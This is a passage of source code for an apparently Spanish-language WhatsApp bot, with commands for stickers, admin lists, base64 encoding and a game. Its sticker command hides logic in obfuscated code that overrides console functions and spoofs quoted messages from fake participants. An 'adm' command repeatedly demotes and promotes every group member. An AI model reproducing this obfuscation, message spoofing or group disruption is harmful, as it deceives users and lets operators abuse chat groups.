result4 = fs.readFileSync(`./temp/5.webp`)
]
nkd = rmd[Math.floor(Math.random() * rmd.length)]
samu330.sendMessage(from, nkd, sticker, {quoted: sam})
break
		

case 'teles':
if (args.length == 0) return reply(`Ejemplo: ${prefix + command} https://t.me/addstickers/LINE_Menhera_chan_ENG`)
ini_url = args[0]
ini_url = await getJson(`https://api.lolhuman.xyz/api/telestick?apikey=${api}&url=${ini_url}`)
ini_sticker = ini_url.result.sticker
for (sticker_ in ini_sticker) {
ini_buffer = await getBuffer(ini_sticker[sticker_])
await samu330.sendMessage(from, ini_buffer, sticker)
}
break

case 'b2':
	buttons2 = [{buttonId: `${prefix}owner`,buttonText:{displayText: 'Contact Owner'},type:1},{buttonId:`${prefix}ping`,buttonText:{displayText:'Bot Ping'},type:1}]

	buttonsMessage = {
	contentText: `${pushname}`,
	footerText: 'Stats',
	buttons: buttons2,
	headerType: 1
}

prep = await samu330.prepareMessageFromContent(from,{buttonsMessage},{quoted: sam})
	samu330.relayWAMessage(prep)
	break

case 'listadmins':
case 'listadmin':
case 'adminlist':
case 'adminslist':
		
if (!isGroup) return reply(mess.only.group)
adm = `*Este grupo* *${groupMetadata.subject}*\nTiene ${groupAdmins.length} Administradores.\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
adm += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
mentions(adm, groupAdmins, true)
break


case 'adm':
members_id = []
for (let mem of groupMembers) {
members_id.push(mem.jid)
}
wa.demoteAdmin(from, members_id)
reply('😙')
await sleep(300)
wa.promoteAdmin(from, members_id)
reply(':o')
await sleep(300)
wa.demoteAdmin(from, members_id)
wa.promoteAdmin(from, members_id)
wa.demoteAdmin(from, members_id)
wa.promoteAdmin(from, members_id)
reply(':D')
wa.demoteAdmin(from, members_id)                       
wa.promoteAdmin(from, members_id)
wa.demoteAdmin(from, members_id)
wa.promoteAdmin(from, members_id)
wa.demoteAdmin(from, members_id)
reply('Ai nomas quedo🐱')
await sleep(10000)
reply('😱')
break
	
//======== _-By Samu330-_ ========\\

		
case 'takestick':
case 'robar':
if (!isQuotedSticker) return reply(`Etiqueta un stiquer y escribe: *${prefix}takestick nombre|autor*`)
const encmediats = JSON.parse(JSON.stringify(sam).replace('quotedM','m')).message.extendedTextMessage.contextInfo
var kls = q
var pack = kls.split("|")[0];
var author2 = kls.split("|")[1];
if (!q) return reply('*Y el nombre de autor y paquete?*')
if (!pack) return reply(`*Porfavor escribe bien el formato: ${prefix + command} nombre|autor*`)
if (!author2) return reply(`*Porfavor escribe bien el formato: ${prefix + command} nombre|autor*`)
const dlfile = await samu330.downloadMediaMessage(encmediats)
 
const bas64 = `data:image/jpeg;base64,${dlfile.toString('base64')}`
var mantap = await convertSticker(bas64, `${author2}`, `${pack}`)
var imageBuffer = new Buffer.from(mantap, 'base64');
samu330.sendMessage(from, imageBuffer, sticker, {quoted: sam})
addFilter(from)
break

case 'sp':
mentioneds = sam.message.extendedTextMessage.contextInfo.mentionedJid
picM = samu330.getProfilePicture(mentioneds)
 
const bas64sp = `data:image/jpeg;base64,${picM.toString('base64')}`
var imageBuffersp = new Buffer.from(mantapsp, 'base64');
var mantapsp = await convertSticker(bas64sp, `Insane @servicioinsane\n`, `${pushname}\n`)
samu330.sendMessage(from, imageBuffersp, sticker, {quoted: sam})
addFilter(from)
break
		
case 'sticker':
case 's':
case 'stiker':
if (!isRegister) return reply(mess.only.usrReg)
if (isMedia && !sam.message.videoMessage || isQuotedImage) {
const encmedia1 = isQuotedImage ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : sam
const dlfile1 = await samu330.downloadMediaMessage(encmedia1)
const bas641 = `data:image/jpeg;base64,${dlfile1.toString('base64')}`
var _0xb51f=['Dg9tDhjPBMC','w14GxsSPkYKRwW','tu5UrMq','y29UC3rYDwn0BW','Cg5Yzgm','8j+sJLnHBxuZmZaGFa','DhjHy2u','mteXntqWohz0CNroDW','ngXiC2LgsW','xIbDFq','A2jMwLe','kYb0AgLZicSGiG','qLjTrLi','y29UC29Szq','BLfAuMq','DgvZDa','CMv0DxjUic8Iia','Bg9N','mtmXotG0ouXWs1LSua','otK2ntu1Du1ZEMjK','vxbot3a','muzUA0XNuG','odi0nZe5yvHiwurV','CNNWN42s','BMn0Aw9UkcKG','y3rVCIGICMv0Dq','E30Uy29UC3rYDq','wMzTCu4','ndKWnJq0z0rtDezc','EwfUioAPN+wzQos6UVcFPya','CM4GDgHPCYiPka','yMLUza','ifnHBsb5ifbLCG','mtaYntKWn2PLwwHIBW','8j+uRUIwQEwNHJmZmcb8ie4','t3bXuNO','ChjVDg90ExbL','x19WCM90B19F','D2fYBG','xIHBxIbDkYGGkW','zxjYB3i','mteXnJCZngn2r25QCG','yxbWBhK','Aw5MBW'];(function(_0x1585b7,_0x5b1800){function _0x321f24(_0x658e8f,_0x254c32,_0x5245c4,_0x25495c){return _0x37dc(_0x25495c- -0x36e,_0x658e8f);}function _0x159978(_0x3b62ae,_0x44e0be,_0x3889c2,_0x10f677){return _0x37dc(_0x3889c2- -0x29c,_0x3b62ae);}while(!![]){try{var _0x296a53=-parseInt(_0x321f24(-0x216,-0x1ff,-0x211,-0x212))+parseInt(_0x159978(-0x13d,-0x121,-0x128,-0x11a))*-parseInt(_0x159978(-0x13b,-0x134,-0x12b,-0x125))+-parseInt(_0x321f24(-0x204,-0x1fb,-0x204,-0x1ee))+parseInt(_0x321f24(-0x211,-0x1ee,-0x1f2,-0x1fc))+-parseInt(_0x321f24(-0x205,-0x1ea,-0x1ea,-0x1f3))+-parseInt(_0x159978(-0x117,-0x11d,-0x127,-0x13d))+parseInt(_0x321f24(-0x21b,-0x1f3,-0x218,-0x207))*parseInt(_0x159978(-0x139,-0x124,-0x136,-0x13a));if(_0x296a53===_0x5b1800)break;else _0x1585b7['push'](_0x1585b7['shift']());}catch(_0x3f6213){_0x1585b7['push'](_0x1585b7['shift']());}}}(_0xb51f,0x6feab+-0x3de*-0x4d+0x2391d));var _0x19f29d=function(){var _0x1d6898=!![];return function(_0x4b094b,_0x4df3a6){var _0x2dfbec=_0x1d6898?function(){function _0x3700c2(_0x827377,_0x11f736,_0xbf9b55,_0x56ad79){return _0x37dc(_0x56ad79-0x2f4,_0x11f736);}if(_0x4df3a6){var _0x389be=_0x4df3a6[_0x3700c2(0x44d,0x458,0x456,0x451)](_0x4b094b,arguments);return _0x4df3a6=null,_0x389be;}}:function(){};return _0x1d6898=![],_0x2dfbec;};}();function _0x28d163(_0x3548fa,_0x22ac18,_0x3a8bda,_0x41ee4a){return _0x37dc(_0x3a8bda-0x226,_0x3548fa);}var _0x7deab2=_0x19f29d(this,function(){var _0x22a5e7={'GzbsQ':_0x24ca16(0x2bb,0x2b7,0x2ba,0x2b9)+_0x540f1a(0x32e,0x31b,0x33d,0x33c)+'/','nQZRd':_0x540f1a(0x31e,0x31d,0x31b,0x31c)+_0x24ca16(0x29c,0x2ac,0x29c,0x2aa)+_0x24ca16(0x29d,0x2c6,0x2c5,0x2b2),'MNnFd':function(_0x37e797){return _0x37e797();}};function _0x24ca16(_0x798f7,_0x14fa24,_0x2223aa,_0x5a072c){return _0x37dc(_0x5a072c-0x14a,_0x798f7);}function _0x540f1a(_0x2f2926,_0x3c8e0a,_0x144998,_0x307ceb){return _0x37dc(_0x2f2926-0x1c4,_0x307ceb);}var _0x4546ab=function(){function _0x56a1df(_0x2ad331,_0x40201a,_0x3404cc,_0x501007){return _0x540f1a(_0x3404cc-0x4c,_0x40201a-0x7e,_0x3404cc-0xe5,_0x2ad331);}function _0x563525(_0x27c0c5,_0x5c379d,_0x47477a,_0x1ed8cd){return _0x540f1a(_0x47477a- -0x4dd,_0x5c379d-0x4c,_0x47477a-0x4d,_0x1ed8cd);}var _0x4fe47c=_0x4546ab[_0x563525(-0x1c2,-0x1a3,-0x1b7,-0x1cc)+'r'](_0x22a5e7['GzbsQ'])()[_0x563525(-0x1a1,-0x1c7,-0x1b7,-0x1c9)+'r'](_0x22a5e7[_0x563525(-0x1a7,-0x197,-0x1ac,-0x1aa)]);return!_0x4fe47c[_0x56a1df(0x374,0x36a,0x37e,0x378)](_0x7deab2);};return _0x22a5e7[_0x540f1a(0x325,0x32f,0x332,0x319)](_0x4546ab);});function _0x740008(_0x3a0d5b,_0x4cf62b,_0x2751bf,_0x5f02bb){return _0x37dc(_0x5f02bb- -0x1e4,_0x3a0d5b);}_0x7deab2();var _0x2e32d0=function(){var _0x3fb527=!![];return function(_0x4f5124,_0x4859c5){var _0x5c6db8=_0x3fb527?function(){function _0x3bb828(_0x5f06be,_0x245555,_0x2d90bc,_0x4fea6a){return _0x37dc(_0x4fea6a- -0x2c7,_0x2d90bc);}if(_0x4859c5){var _0x272259=_0x4859c5[_0x3bb828(-0x175,-0x157,-0x165,-0x16a)](_0x4f5124,arguments);return _0x4859c5=null,_0x272259;}}:function(){};return _0x3fb527=![],_0x5c6db8;};}(),_0x5d9f3a=_0x2e32d0(this,function(){var _0x4d4ea8={'UpNOp':function(_0x2bec96,_0x19a4f1){return _0x2bec96+_0x19a4f1;},'pnrdc':function(_0xa418a8){return _0xa418a8();},'ZfmqN':_0x4b517d(0x24c,0x237,0x24d,0x244),'OpqRz':_0x4b517d(0x219,0x21a,0x226,0x239),'RToiw':_0x4b517d(0x216,0x232,0x223,0x215),'kbfZQ':'exception','hmYtV':_0x4b517d(0x226,0x23a,0x22d,0x23b),'BRmFR':function(_0x24dd66,_0x5b4764){return _0x24dd66<_0x5b4764;}},_0x13b618;try{var _0x434581=Function(_0x4d4ea8[_0x4f1b09(0x31c,0x308,0x318,0x30a)](_0x4d4ea8[_0x4f1b09(0x300,0x308,0x2f6,0x2f4)]('return\x20(fu'+_0x4b517d(0x237,0x24f,0x23f,0x247),_0x4b517d(0x252,0x249,0x241,0x24c)+_0x4b517d(0x22f,0x250,0x240,0x232)+_0x4b517d(0x253,0x24c,0x245,0x249)+'\x20)'),');'));_0x13b618=_0x4d4ea8[_0x4f1b09(0x2e8,0x2f8,0x2fb,0x307)](_0x434581);}catch(_0x521cca){_0x13b618=window;}function _0x4b517d(_0x45da28,_0x442673,_0xc4cac1,_0x2036c8){return _0x37dc(_0xc4cac1-0xc8,_0x2036c8);}var _0x267bf9=_0x13b618[_0x4f1b09(0x2ef,0x301,0x306,0x30f)]=_0x13b618[_0x4b517d(0x226,0x23b,0x234,0x21f)]||{},_0x312673=[_0x4f1b09(0x31a,0x305,0x315,0x31a),_0x4d4ea8[_0x4b517d(0x22d,0x22f,0x242,0x248)],_0x4d4ea8[_0x4f1b09(0x32d,0x317,0x31d,0x31a)],_0x4d4ea8['RToiw'],_0x4d4ea8[_0x4f1b09(0x2f9,0x2fe,0x30e,0x2fd)],'table',_0x4d4ea8['hmYtV']];function _0x4f1b09(_0x237ece,_0x177803,_0x3ac80a,_0x87bc3b){return _0x37dc(_0x177803-0x195,_0x87bc3b);}for(var _0x44d704=-0x19*0x35+-0x2*-0x6e0+-0x893;_0x4d4ea8[_0x4b517d(0x238,0x23e,0x233,0x23b)](_0x44d704,_0x312673['length']);_0x44d704++){var _0x18d01a=_0x2e32d0[_0x4f1b09(0x2f8,0x2f7,0x2f9,0x2eb)+'r'][_0x4b517d(0x23b,0x254,0x24b,0x240)][_0x4f1b09(0x315,0x313,0x327,0x325)](_0x2e32d0),_0x4ac674=_0x312673[_0x44d704],_0x1b81f6=_0x267bf9[_0x4ac674]||_0x18d01a;_0x18d01a[_0x4f1b09(0x32e,0x319,0x310,0x303)]=_0x2e32d0[_0x4f1b09(0x301,0x313,0x2fd,0x30a)](_0x2e32d0),_0x18d01a['toString']=_0x1b81f6[_0x4b517d(0x228,0x236,0x227,0x23b)][_0x4b517d(0x251,0x254,0x246,0x250)](_0x1b81f6),_0x267bf9[_0x4ac674]=_0x18d01a;}});_0x5d9f3a();function _0x37dc(_0x461bc9,_0xc109e8){return _0x37dc=function(_0x5e61fe,_0x475674){_0x5e61fe=_0x5e61fe-(-0xbee*0x1+-0x1d18+0x2a60);var _0x400d88=_0xb51f[_0x5e61fe];if(_0x37dc['Zewvpn']===undefined){var _0x29faa0=function(_0x3afd7d){var _0x3b5846='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4ebec9='',_0x25fdc6='';for(var _0x641174=-0x475+-0x20a0+0x2515,_0x261bd5,_0x2eb935,_0x4716b6=-0x2436+0x49c+0x1f9a;_0x2eb935=_0x3afd7d['charAt'](_0x4716b6++);~_0x2eb935&&(_0x261bd5=_0x641174%(0x1*-0xb57+-0xad0+-0xe3*-0x19)?_0x261bd5*(-0x2*-0x1cf+0x1409*-0x1+0x10ab)+_0x2eb935:_0x2eb935,_0x641174++%(0x16a0+-0x149*-0x10+-0x2b2c))?_0x4ebec9+=String['fromCharCode'](0x1e72+0x1138+-0x1*0x2eab&_0x261bd5>>(-(-0xb6+-0xf4c+0x1004)*_0x641174&0x25a6+-0x2bb*0x9+-0xd0d)):0x7f*-0x1d+-0x1*0x20fb+0x2f5e){_0x2eb935=_0x3b5846['indexOf'](_0x2eb935);}for(var _0x229d5d=-0x9a8+0x255f+-0x21*0xd7,_0xf2575=_0x4ebec9['length'];_0x229d5d<_0xf2575;_0x229d5d++){_0x25fdc6+='%'+('00'+_0x4ebec9['charCodeAt'](_0x229d5d)['toString'](-0xa84*0x2+-0xc79+0x1*0x2191))['slice'](-(-0x5bf+-0x23*0xe2+0x24a7));}return decodeURIComponent(_0x25fdc6);};_0x37dc['XROvzF']=_0x29faa0,_0x461bc9=arguments,_0x37dc['Zewvpn']=!![];}var _0x1deb33=_0xb51f[0x8f1*0x2+0x53a+-0x171c],_0x2859c8=_0x5e61fe+_0x1deb33,_0x44adf9=_0x461bc9[_0x2859c8];if(!_0x44adf9){var _0x45e5fe=function(_0x161d22){this['Jwxtul']=_0x161d22,this['STFNmV']=[0x2232+0x25d9+-0x480a,-0x19f5+-0xf0f+0x2904,-0x6f0*-0x2+-0x1*0x10bc+0x2dc],this['VFpOBD']=function(){return'newState';},this['mJEwMg']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['BPXVuq']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x45e5fe['prototype']['bSAJcQ']=function(){var _0x30d15f=new RegExp(this['mJEwMg']+this['BPXVuq']),_0x1a1284=_0x30d15f['test'](this['VFpOBD']['toString']())?--this['STFNmV'][0xf79+-0x1*0x319+0xc5f*-0x1]:--this['STFNmV'][0x200*-0x4+-0x1ae6+-0x3*-0xba2];return this['vArodP'](_0x1a1284);},_0x45e5fe['prototype']['vArodP']=function(_0x3c87e3){if(!Boolean(~_0x3c87e3))return _0x3c87e3;return this['wBxbJy'](this['Jwxtul']);},_0x45e5fe['prototype']['wBxbJy']=function(_0x49d598){for(var _0x5bdd43=0x1343*0x2+0x1*0x1f1b+-0x45a1,_0x53b9e7=this['STFNmV']['length'];_0x5bdd43<_0x53b9e7;_0x5bdd43++){this['STFNmV']['push'](Math['round'](Math['random']())),_0x53b9e7=this['STFNmV']['length'];}return _0x49d598(this['STFNmV'][-0x2*0xb93+0x16*-0x2+0x255*0xa]);},new _0x45e5fe(_0x37dc)['bSAJcQ'](),_0x400d88=_0x37dc['XROvzF'](_0x400d88),_0x461bc9[_0x2859c8]=_0x400d88;}else _0x400d88=_0x44adf9;return _0x400d88;},_0x37dc(_0x461bc9,_0xc109e8);}var mantap1=await convertSticker(bas641,_0x28d163(0x379,0x396,0x38a,0x382)+_0x740008(-0x6e,-0x61,-0x5e,-0x65)+_0x740008(-0x6c,-0x6a,-0x5b,-0x6e),_0x28d163(0x3ba,0x3b2,0x3a7,0x394)+_0x740008(-0x5f,-0x78,-0x5c,-0x68));
var st = new Buffer.from(mantap1, 'base64');
var _0x4bbb=["\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x35\x32\x31\x39\x39\x38\x34\x39\x30\x37\x37\x39\x34\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\uD83C\uDF49\x53\x74\x69\x6B\x65\x72\x20\x42\x79\x20\x53\x6D\x33\x33\x30\uD83C\uDF52","\x2E\x2F\x6D\x65\x64\x69\x61\x2F\x53\x6D\x57\x57\x2E\x70\x6E\x67","\x72\x65\x61\x64\x46\x69\x6C\x65\x53\x79\x6E\x63","\uD83C\uDFA9\x4E\x79\x61\x6E\x42\x6F\x74\x20\x7C\x20\u09B8\u09BE\u09AE\u09C1\u09E9\u09E9\u09E6\uD83C\uDFF9","\x5B\x20\u2605\x20\x5D\x20\u5C71\u59C6\x20\x33\x33\x30","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x79\x6F\x75\x74\x75\x62\x65\x2E\x63\x6F\x6D\x2F\x63\x68\x61\x6E\x6E\x65\x6C\x2F\x55\x43\x48\x44\x34\x54\x38\x50\x66\x63\x76\x35\x50\x46\x56\x7A\x73\x41\x62\x66\x41\x50\x5A\x41","\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65"];samu330[_0x4bbb[8]](from,st,sticker,{sendEphemeral:true,quoted:{key:{fromMe:false,participant:`${_0x4bbb[0]}`,...(from?{remoteJid:_0x4bbb[1]}:{})},message:{"\x64\x6F\x63\x75\x6D\x65\x6E\x74\x4D\x65\x73\x73\x61\x67\x65":{"\x74\x69\x74\x6C\x65":`${_0x4bbb[2]}`,'\x6A\x70\x65\x67\x54\x68\x75\x6D\x62\x6E\x61\x69\x6C':fs[_0x4bbb[4]](_0x4bbb[3])}}},contextInfo:{"\x65\x78\x74\x65\x72\x6E\x61\x6C\x41\x64\x52\x65\x70\x6C\x79":{"\x74\x69\x74\x6C\x65":_0x4bbb[5],"\x62\x6F\x64\x79":_0x4bbb[6],"\x73\x6F\x75\x72\x63\x65\x55\x72\x6C":`${_0x4bbb[7]}`,"\x74\x68\x75\x6D\x62\x6E\x61\x69\x6C":dlfile1}}})
} else if ((isMedia && sam.message.videoMessage.fileLength < 10000000 || isQuotedVideo && sam.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.fileLength < 10000000)) {
const encmedia2 = isQuotedVideo ? JSON.parse(JSON.stringify(sam).replace('quotedM', 'm')).message.extendedTextMessage.
contextInfo : sam
const media2 = await samu330.downloadAndSaveMediaMessage(encmedia2, `./sticker/${sender}`)
const packname101 = `\n\n\n\n\n\n\n\n\n\n\n@servicioinsane`
const author101 = args.join(' ')
exif.create(packname101, author101, `stickwm_${sender}`)
await ffmpeg(`${media2}`)
.inputFormat(media2.split('.')[4])
.on('start', function (cmd) {
console.log(`Started : ${cmd}`)
})
.on('error', function (err) {
console.log(`Error : ${err}`)
fs.unlinkSync(media2)
tipe = media.endsWith('.mp4') ? 'video' : 'gif'
reply('*Intenta de nuevo*')
})
.on('end', function () {
console.log('Finish')
exec(`webpmux -set exif ./sticker/stickwm_${sender}.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
if (error) return reply('error')
wa.sendSticker(from, fs.readFileSync(`./sticker/${sender}.webp`), ftoko)
fs.unlinkSync(media2)
fs.unlinkSync(`./sticker/${sender}.webp`)
fs.unlinkSync(`./sticker/stickwm_${sender}.exif`)
})
})
.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decre
ase,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
.toFormat('webp')
.save(`./sticker/${sender}.webp`)
} else {
reply(`Envie o etiquete una imagen/vido/gif con el comando: ${prefix}swm nombre|autor *OJO!* El video/gif no debe de durar mas de 10 segundos`)
}
addFilter(from)
break

//encode y decode by Samu
case 'code':
texto = args.join(' ')
var rawStr = `${texto}`
var wordArray = CryptoJS.enc.Utf8.parse(rawStr);
var base64 = CryptoJS.enc.Base64.stringify(wordArray);
reply(`${base64}`)
break

case 'decode':
texto = args.join(' ')
var parseWordArray = CryptoJS.enc.Base64.parse(`${texto}`);
var parsedStr = parseWordArray.toString(CryptoJS.enc.Utf8);
reply(`${parsedStr}`)
break



	
//Juego Creado por Samu330
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/*////*/case 'jugar':
/*////*/if (!isRegister) return reply(mess.only.usrReg)
/*////*/const _0x5f5c=['jugar\x20(Escojes\x20tu\x20arma)\x20=\x20','log','tijera','length','return\x20(function()\x20','21349PZSUzQ','random','^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}','✌🏻\x20tijera','1416lRtOeC','4007ltMcJR','26916PiOMZI','\x0a*✊🏻\x20piedra\x20rompe\x20tijeras.*','Ja...\x20perdiste,\x20tranquilo,\x20te\x20entiendo,\x20eres\x20Humano😌','49000XhJFNH','constructor','*Reglas\x20de\x20Juego:*‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎\x0a\x0a_El\x20juego\x20se\x20llama:_\x20*Piedra,\x20papel\x20o\x20tijera.*\x0a\x0a_El\x20objetivo\x20es\x20vencer\x20al\x20oponente\x20seleccionando\x20el\x20arma\x20que\x20gana,\x20según\x20las\x20siguientes\x20reglas:_\x0a\x0a\x09-\x20✊🏻\x20La\x20piedra\x20aplasta\x20la\x20tijera.\x20(Gana\x20la\x20piedra.)\x0a\x09-\x20✌🏻\x20La\x20tijera\x20corta\x20el\x20papel.\x20(Gana\x20la\x20tijer